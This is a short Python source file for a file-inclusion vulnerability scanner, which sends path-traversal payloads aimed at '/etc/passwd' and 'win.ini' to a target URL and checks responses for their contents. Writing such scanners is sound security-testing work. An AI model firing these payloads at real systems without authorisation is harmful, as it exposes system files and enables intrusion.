# scanner/file_inclusion.py
import requests

class FileInclusionScanner:
    def __init__(self, target_url):
        self.target_url = target_url

    def scan(self):
        print(f"Scanning {self.target_url} for file inclusion vulnerabilities...")
        payloads = ["?file=../../etc/passwd", "?page=../../windows/win.ini"]
        for payload in payloads:
            response = requests.get(self.target_url + payload)
            if "root:" in response.text or "[boot loader]" in response.text:
                print(f"Potential file inclusion vulnerability found with payload: {payload}")